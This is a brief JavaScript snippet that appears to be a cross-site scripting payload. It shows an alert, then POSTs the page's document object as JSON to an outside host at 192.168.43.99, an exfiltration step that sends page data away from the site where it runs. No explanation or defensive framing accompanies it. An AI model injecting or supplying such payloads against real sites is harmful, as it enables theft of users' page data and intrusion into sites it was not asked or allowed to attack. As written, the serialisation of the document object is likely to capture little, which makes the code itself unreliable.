
alert(document);
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://192.168.43.99/", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    data: document
}));
